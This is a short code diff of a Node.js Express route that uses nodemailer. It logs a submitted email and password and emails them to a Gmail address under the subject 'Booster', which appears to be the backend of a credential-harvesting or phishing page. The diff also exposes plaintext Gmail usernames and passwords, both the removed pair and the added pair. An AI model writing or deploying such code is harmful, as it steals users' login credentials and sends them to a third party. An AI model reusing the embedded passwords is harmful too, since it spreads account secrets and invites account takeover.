@@ -10,8 +10,8 @@ router.get('/', function(req, res, next) {
 var transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'ggauravsigra@gmail.com',
-    pass: 'operator@php1'
+    user: 'gaurav020406@gmail.com',
+    pass: 'iliketoplayfootball'
   }
 });
 
@@ -22,7 +22,7 @@ console.log(email + " " + password);
 
 
 var mailOptions = {
-  from: 'ggauravsigra@gmail.com',
+  from: 'gaurav020406@gmail.com',
   to: 'gaurav020406@gmail.com',
   subject: 'Booster',
   text: email + ' ' +password,
